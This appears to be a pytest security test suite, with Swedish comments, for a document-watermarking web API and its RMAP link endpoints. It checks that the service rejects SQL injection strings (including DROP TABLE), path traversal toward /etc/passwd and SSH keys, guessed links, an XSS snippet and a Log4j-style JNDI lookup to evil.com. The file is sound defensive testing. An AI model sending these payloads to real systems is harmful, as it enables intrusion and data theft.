import pytest
import json
import io
import hashlib
from pathlib import Path


class TestRMAPSecurityBasic:
    

    def test_rmap_initiate_without_payload(self, client):
        r = client.post("/api/rmap-initiate", json={})
    
        assert r.status_code in (400, 404, 500), f"Unexpected status: {r.status_code}"
        if r.status_code == 400:
            data = r.get_json()
            if data:  # Om vi f√•r JSON-svar
                assert "error" in data or "message" in data

    def test_rmap_initiate_with_empty_payload(self, client):
        
        r = client.post("/api/rmap-initiate", json={"payload": ""})
        
        assert r.status_code in (400, 404, 500), f"Unexpected status: {r.status_code}"

    def test_rmap_initiate_with_invalid_base64(self, client):
        
        r = client.post("/api/rmap-initiate", json={"payload": "not-valid-base64!!!"})
        
        assert r.status_code in (400, 404, 500), f"Unexpected status: {r.status_code}"

    def test_rmap_get_link_without_payload(self, client):
    
        r = client.post("/api/rmap-get-link", json={})
        
        assert r.status_code in (400, 404, 500), f"Unexpected status: {r.status_code}"
        if r.status_code == 400:
            data = r.get_json()
            if data:
                assert "error" in data or "message" in data

    def test_rmap_get_link_with_invalid_payload(self, client):
        
        r = client.post("/api/rmap-get-link", json={"payload": "invalid"})
        
        assert r.status_code in (400, 404, 500), f"Unexpected status: {r.status_code}"


class TestRMAPLinkManipulation:
    

    def test_sequential_link_guessing(self, client):
        
        test_links = [
            "0" * 32,  
            "f" * 32,  
            "1" * 32,  
            "00000000000000000000000000000001",  
            "00000000000000010000000000000001",  
        ]
        
        successful_access = []
        for link in test_links:
            
            r = client.get(f"/api/document/{link}")
            
            
            if r.status_code == 200:
                successful_access.append(link)
        
        
        if successful_access:
            print(f"\n‚ö†Ô∏è  Warning: These links returned 200: {successful_access}")
            print("   This might be OK if these are valid test links")

    def test_rmap_link_format_variations(self, client):
        
        variations = [
            "ABC" * 10 + "DE",  
            "abc" * 10 + "de", 
            "123" * 10 + "45",  
            "g" * 32,  
            "zzzz" + "0" * 28,  
        ]
        
        for link in variations:
            r = client.get(f"/api/document/{link}")
            
            assert r.status_code in (400, 404)

    def test_rmap_link_length_manipulation(self, client):
        """Testa l√§nkar med fel l√§ngd."""
        test_cases = [
            "a" * 31,  # F√∂r kort
            "a" * 33,  # F√∂r l√•ng
            "a" * 16,  # Halva l√§ngden
            "a" * 64,  # Dubbla l√§ngden
            "",        # Tom
        ]
        
        for link in test_cases:
            r = client.get(f"/api/document/{link}")
            assert r.status_code in (400, 404)


class TestRMAPNonceManipulation:
    """Tester f√∂r att manipulera nonce-v√§rden."""

    def test_manual_nonce_construction(self, client):
        """F√∂rs√∂k skapa l√§nkar genom att manuellt konstruera nonce-par."""
        # Testa olika nonce-kombinationer
        nonce_pairs = [
            (0, 0),
            (1, 1),
            (0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF),
            (12345, 67890),
            (0x1000, 0x2000),
        ]
        
        for nc, ns in nonce_pairs:
            # Konstruera l√§nk enligt formatet: f"{nc:016x}{ns:016x}"
            link = f"{nc:016x}{ns:016x}"
            r = client.get(f"/api/document/{link}")
            # Dessa l√§nkar b√∂r inte ge tillg√•ng till dokument
            assert r.status_code in (400, 404)

    def test_nonce_overflow_attempts(self, client):
        """Testa att manipulera nonces med overflow-v√§rden."""
        # F√∂rs√∂k med v√§rden som kan orsaka overflow
        overflow_values = [
            (2**64, 0),           # √ñver 64-bit gr√§ns
            (0, 2**64),
            (-1, 0),              # Negativa v√§rden
            (0, -1),
            (2**128, 2**128),     # Mycket stora v√§rden
        ]
        
        for nc, ns in overflow_values:
            try:
                # Python till√•ter stora int, men hex-formateringen kan misslyckas
                link = f"{nc:016x}{ns:016x}"
                r = client.get(f"/api/document/{link}")
                assert r.status_code in (400, 404)
            except (ValueError, OverflowError):
                # F√∂rv√§ntat om v√§rdet √§r f√∂r stort
                pass


class TestRMAPDatabaseInjection:
    """Tester f√∂r SQL injection via RMAP-systemet."""

    def test_sql_injection_in_link(self, client):
        """F√∂rs√∂k SQL injection via l√§nkparameter."""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE Versions; --",
            "' UNION SELECT * FROM Documents --",
            "1' AND '1'='1",
            "admin'--",
            "' OR 1=1--",
        ]
        
        for payload in sql_payloads:
            r = client.get(f"/api/document/{payload}")
            # B√∂r inte ge tillg√•ng eller krascha
            assert r.status_code in (400, 404)

    def test_sql_injection_in_payload(self, client):
        """F√∂rs√∂k SQL injection via RMAP payload."""
        sql_payloads = [
            "' OR '1'='1",
            "'; SELECT * FROM Users --",
            "' UNION SELECT path FROM Documents --",
        ]
        
        for payload in sql_payloads:
            r = client.post("/api/rmap-initiate", json={"payload": payload})
            # B√∂r avvisas som ogiltig payload
            assert r.status_code == 400


class TestRMAPPathTraversal:
    """Tester f√∂r path traversal-attacker via RMAP."""

    def test_path_traversal_in_link(self, client):
        """F√∂rs√∂k path traversal via l√§nk."""
        traversal_attempts = [
            "../" * 10 + "etc/passwd",
            "..%2F" * 10 + "etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f" * 10 + "etc/passwd",
        ]
        
        for attempt in traversal_attempts:
            r = client.get(f"/api/document/{attempt}")
            assert r.status_code in (400, 404)

    def test_absolute_path_injection(self, client):
        """F√∂rs√∂k injicera absoluta s√∂kv√§gar."""
        path_attempts = [
            "/etc/passwd",
            "/var/log/app/app.log",
            "/root/.ssh/id_rsa",
            "C:\\Windows\\System32\\config\\SAM",
        ]
        
        for path in path_attempts:
            r = client.get(f"/api/document/{path}")
            assert r.status_code in (400, 404)


class TestRMAPCrossUserAccess:
    """Tester f√∂r att kontrollera cross-user access via RMAP."""

    def test_access_other_users_documents(self, client):
        """
        Scenario: Tv√• anv√§ndare skapar RMAP-sessioner.
        Verifiera att anv√§ndare A inte kan f√• anv√§ndare B:s dokument.
        """
        # Skapa tv√• anv√§ndare
        user1_login = f"user1_{pytest.__version__.replace('.', '')}"
        user1_email = f"{user1_login}@test.com"
        user1_pwd = "SecurePass123!"
        
        user2_login = f"user2_{pytest.__version__.replace('.', '')}"
        user2_email = f"{user2_login}@test.com"
        user2_pwd = "SecurePass456!"
        
        # Registrera anv√§ndare 1
        r1 = client.post("/api/create-user", json={
            "login": user1_login,
            "email": user1_email,
            "password": user1_pwd
        })
        assert r1.status_code in (200, 201)
        
        # Registrera anv√§ndare 2
        r2 = client.post("/api/create-user", json={
            "login": user2_login,
            "email": user2_email,
            "password": user2_pwd
        })
        assert r2.status_code in (200, 201)
        
        # Logga in anv√§ndare 1
        login1 = client.post("/api/login", json={
            "email": user1_email,
            "password": user1_pwd
        }).get_json()
        assert "token" in login1
        token1 = login1["token"]
        
        # Logga in anv√§ndare 2
        login2 = client.post("/api/login", json={
            "email": user2_email,
            "password": user2_pwd
        }).get_json()
        assert "token" in login2
        token2 = login2["token"]
        
        # B√•da anv√§ndarna har nu tokens
        # I en riktig attack skulle man f√∂rs√∂ka anv√§nda user1:s token
        # f√∂r att f√• user2:s RMAP-dokument
        
        # Detta √§r en begr√§nsad test eftersom vi inte har riktiga RMAP-klienter
        # Men vi kan verifiera att endpoints inte l√§cker information
        assert token1 != token2


class TestRMAPTimingAttacks:
    """Tester f√∂r timing-baserade attacker."""

    def test_timing_attack_on_link_validation(self, client):
        """
        M√§t svarstider f√∂r att se om giltiga vs ogiltiga l√§nkar
        ger olika svarstider (timing attack).
        
        NOTE: Detta test √§r informativt och failar inte h√•rt.
        """
        import time
        
        # Testa ogiltiga l√§nkar
        invalid_links = ["0" * 32, "f" * 32, "a" * 32]
        invalid_times = []
        
        for link in invalid_links:
            start = time.time()
            try:
                client.get(f"/api/document/{link}")
            except Exception:
                pass  # Ignorera eventuella fel
            elapsed = time.time() - start
            invalid_times.append(elapsed)
        
        # I ett s√§kert system b√∂r alla svar ta ungef√§r lika l√•ng tid
        # Detta √§r en indikation, inte ett definitivt bevis
        if invalid_times:
            avg_time = sum(invalid_times) / len(invalid_times)
            
            # Verifiera att tiderna inte varierar extremt
            for t in invalid_times:
                # Till√•t viss variation, men inte mer √§n 100x (mycket gener√∂st)
                if avg_time > 0 and t > avg_time * 100:
                    print(f"\n‚ö†Ô∏è  Warning: Large timing variation detected: {t:.4f}s vs avg {avg_time:.4f}s")
                    print("   This MIGHT indicate timing attack vulnerability")
        else:
            print("\n‚ö†Ô∏è  Could not measure timing - test inconclusive")


class TestRMAPBruteForce:
    """Tester f√∂r brute force-attacker mot RMAP."""

    def test_rapid_link_enumeration(self, client):
        """
        F√∂rs√∂k snabbt r√§kna upp m√•nga l√§nkar f√∂r att se om n√•gon ger tillg√•ng.
        Detta b√∂r begr√§nsas av rate limiting i produktion.
        
        NOTE: Rate limiting kan vara inaktiverat i test-milj√∂n.
        """
        attempts = 0
        max_attempts = 50
        rate_limited = False
        successful_links = []
        
        for i in range(max_attempts):
            link = f"{i:032x}"  # Sekventiella hex-v√§rden
            r = client.get(f"/api/document/{link}")
            attempts += 1
            
            # Om rate limiting fungerar b√∂r vi f√• 429 efter ett antal f√∂rs√∂k
            if r.status_code == 429:
                rate_limited = True
                print(f"\n‚úÖ Rate limiting activated after {attempts} attempts")
                break
            
            # Om vi fick 200, spara l√§nken
            if r.status_code == 200:
                successful_links.append(link)
        
        # I test-milj√∂n kan rate limiting vara avst√§ngt
        if not rate_limited:
            print(f"\n‚ö†Ô∏è  No rate limiting detected in {attempts} attempts")
            print("   This is OK in test environment but CRITICAL in production!")
        
        # Om vi fick n√•gra lyckade l√§nkar, varna
        if successful_links:
            print(f"\n‚ö†Ô∏è  These links returned 200: {successful_links[:5]}")
            print("   Verify these are valid test links")

    def test_distributed_link_guessing(self, client):
        """
        Simulera en distribuerad attack d√§r man testar l√§nkar
        fr√•n olika delar av nonce-rymden.
        """
        # Testa fr√•n olika "regioner" av nonce-space
        regions = [
            0x0000000000000000,
            0x1000000000000000,
            0x2000000000000000,
            0xF000000000000000,
        ]
        
        for base in regions:
            for offset in range(10):
                nc = base + offset
                ns = base + offset + 1
                link = f"{nc:016x}{ns:016x}"
                r = client.get(f"/api/document/{link}")
                assert r.status_code in (400, 404)


class TestRMAPIdentityLeakage:
    """Tester f√∂r att uppt√§cka identity-l√§ckage via RMAP."""

    def test_identity_extraction_from_response(self, client):
        """
        Verifiera att RMAP-svar inte l√§cker k√§nslig information
        om anv√§ndaridentiteter.
        """
        # Testa olika endpoints
        endpoints = [
            "/api/rmap-initiate",
            "/api/rmap-get-link",
        ]
        
        for endpoint in endpoints:
            r = client.post(endpoint, json={"payload": "test"})
            # Kontrollera att svar inte inneh√•ller k√§nsliga f√§lt
            if r.status_code == 200:
                data = r.get_json()
                # Verifiera att inte k√§nsliga f√§lt l√§cks
                sensitive_fields = ["identity", "email", "login", "private_key", "nonce_server"]
                for field in sensitive_fields:
                    assert field not in str(data).lower(), f"Might leak {field}"

    def test_nonce_server_extraction_attempt(self, client):
        """
        F√∂rs√∂k extrahera nonceServer fr√•n systemet.
        """
        # Enligt koden anv√§nds nonceServer f√∂r identity-mapping
        # Detta b√∂r inte vara m√∂jligt att f√• ut
        r = client.get("/api/document/0" * 16 + "1" * 16)
        
        if r.status_code == 200:
            # Om vi fick ett svar, verifiera att det inte l√§cker nonce-info
            data = r.get_json() or {}
            assert "nonce" not in str(data).lower()
            assert "identity" not in str(data).lower()


class TestRMAPVersionTableAccess:
    """Tester f√∂r obeh√∂rig √•tkomst till Versions-tabellen."""

    def test_enumerate_all_versions(self, client):
        """
        F√∂rs√∂k r√§kna upp alla versioner i systemet.
        """
        # F√∂rs√∂k f√• en lista √∂ver alla versioner
        r = client.get("/api/versions")
        # Detta endpoint b√∂r inte existera eller vara skyddat
        assert r.status_code in (404, 401, 403)

    def test_access_version_by_id(self, client):
        """
        F√∂rs√∂k f√• √•tkomst till versioner via ID.
        """
        for vid in range(1, 20):
            r = client.get(f"/api/version/{vid}")
            # B√∂r inte vara tillg√§ngligt
            assert r.status_code in (404, 401, 403)

    def test_link_to_path_mapping_exposure(self, client):
        """
        Verifiera att mappningen mellan l√§nkar och fils√∂kv√§gar inte l√§cks.
        """
        # Testa n√•gra l√§nkar
        test_links = ["0" * 32, "a" * 32, "f" * 32]
        
        for link in test_links:
            r = client.get(f"/api/document/{link}")
            
            if r.status_code == 200:
                # Om vi fick data, verifiera att s√∂kv√§gar inte l√§cks
                data = r.get_json() or {}
                response_str = str(data) + str(r.headers)
                
                # S√∂kv√§gar som inte b√∂r exponeras
                sensitive_paths = [
                    "/mnt/",
                    "/home/",
                    "/var/",
                    "static/versions/",
                    "STORAGE_DIR",
                ]
                
                for path in sensitive_paths:
                    assert path not in response_str, f"Path {path} leaked in response"


class TestRMAPDocumentIDLeakage:
    """Tester f√∂r att uppt√§cka document ID-l√§ckage."""

    def test_documentid_enumeration(self, client, auth_headers):
        """
        F√∂rs√∂k r√§kna upp document IDs f√∂r att f√• andra anv√§ndares dokument.
        """
        # Ladda upp ett eget dokument
        pdf_io = io.BytesIO(b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF\n")
        data = {"file": (pdf_io, "mytest.pdf"), "name": "mytest.pdf"}
        r = client.post(
            "/api/upload-document",
            headers=auth_headers,
            data=data,
            content_type="multipart/form-data",
        )
        assert r.status_code in (200, 201)
        
        # F√∂rs√∂k f√• andra dokument via ID-enumeration
        for doc_id in range(1, 50):
            r = client.get(f"/api/document-by-id/{doc_id}", headers=auth_headers)
            # Detta endpoint b√∂r inte existera eller vara s√§kert
            if r.status_code == 200:
                # Om det fungerar, verifiera att det √§r v√•rt eget dokument
                data = r.get_json()
                # B√∂r inte ge andra anv√§ndares dokument


class TestRMAPConcurrency:
    """Tester f√∂r race conditions i RMAP."""

    def test_concurrent_rmap_sessions(self, client):
        """
        Testa att skapa flera RMAP-sessioner samtidigt
        f√∂r att se om det orsakar race conditions.
        """
        import concurrent.futures
        
        def create_session(payload_num):
            try:
                r = client.post("/api/rmap-initiate", json={
                    "payload": f"test{payload_num}"
                })
                return r.status_code, r.get_json()
            except Exception as e:
                return None, str(e)
        
        # K√∂r flera sessioner parallellt
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(create_session, i) for i in range(10)]
            results = [f.result() for f in futures]
        
        # Alla b√∂r ha misslyckats (ogiltiga payloads) eller hanterats korrekt
        for status, data in results:
            if status == 200:
                # Om n√•gon lyckades, verifiera att svaret √§r korrekt
                assert isinstance(data, dict)


class TestRMAPInputValidation:
    """Omfattande input validation-tester."""

    def test_oversized_payload(self, client):
        """Testa med extremt stor payload."""
        huge_payload = "A" * (10 * 1024 * 1024)  # 10 MB
        r = client.post("/api/rmap-initiate", json={"payload": huge_payload})
        # B√∂r avvisas eller hanteras korrekt
        assert r.status_code in (400, 413)

    def test_special_characters_in_payload(self, client):
        """Testa specialtecken i payload."""
        special_chars = [
            "\x00\x01\x02",  # Null bytes
            "../../etc/passwd",  # Path traversal
            "<script>alert('xss')</script>",  # XSS
            "${jndi:ldap://evil.com/a}",  # Log4j style
        ]
        
        for payload in special_chars:
            r = client.post("/api/rmap-initiate", json={"payload": payload})
            assert r.status_code == 400

    def test_unicode_in_link(self, client):
        """Testa unicode-tecken i l√§nkar."""
        unicode_attempts = [
            "√•√•√•" + "0" * 29,
            "üòÄ" * 32,
            "\u0000" * 32,
        ]
        
        for link in unicode_attempts:
            r = client.get(f"/api/document/{link}")
            assert r.status_code in (400, 404)


class TestRMAPErrorMessages:
    """Tester f√∂r att verifiera att felmeddelanden inte l√§cker information."""

    def test_error_message_information_disclosure(self, client):
        """
        Verifiera att felmeddelanden inte avsl√∂jar systemdetaljer.
        """
        # Testa olika endpoints med ogiltiga inputs
        test_cases = [
            ("/api/rmap-initiate", {"payload": "invalid"}),
            ("/api/rmap-get-link", {"payload": "invalid"}),
        ]
        
        for endpoint, data in test_cases:
            r = client.post(endpoint, json=data)
            response_text = r.get_data(as_text=True).lower()
            
            # Verifiera att k√§nslig information inte l√§cks
            sensitive_info = [
                "traceback",
                "/home/",
                "/var/",
                "mysql",
                "password",
                "secret_key",
                "api_key",
            ]
            
            for info in sensitive_info:
                assert info not in response_text, f"Error message leaks: {info}"


class TestRMAPWatermarkExtraction:
    """Tester f√∂r att f√∂rs√∂ka extrahera vattenm√§rken fr√•n andra dokument."""

    def test_extract_watermark_from_guessed_link(self, client, auth_headers):
        """
        F√∂rs√∂k extrahera vattenm√§rke fr√•n ett dokument via gissad l√§nk.
        """
        # Generera n√•gra test-l√§nkar
        test_links = [
            "0" * 32,
            "1" * 32,
            "deadbeef" * 4,
        ]
        
        for link in test_links:
            # F√∂rs√∂k l√§sa vattenm√§rke
            r = client.post(
                "/api/read-watermark",
                headers=auth_headers,
                json={"link": link}
            )
            
            # B√∂r inte kunna l√§sa vattenm√§rken fr√•n icke-existerande dokument
            if r.status_code == 200:
                data = r.get_json()
                # Om det fungerar, verifiera att det inte l√§cker data
                assert "error" in data or data.get("watermark") is None


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])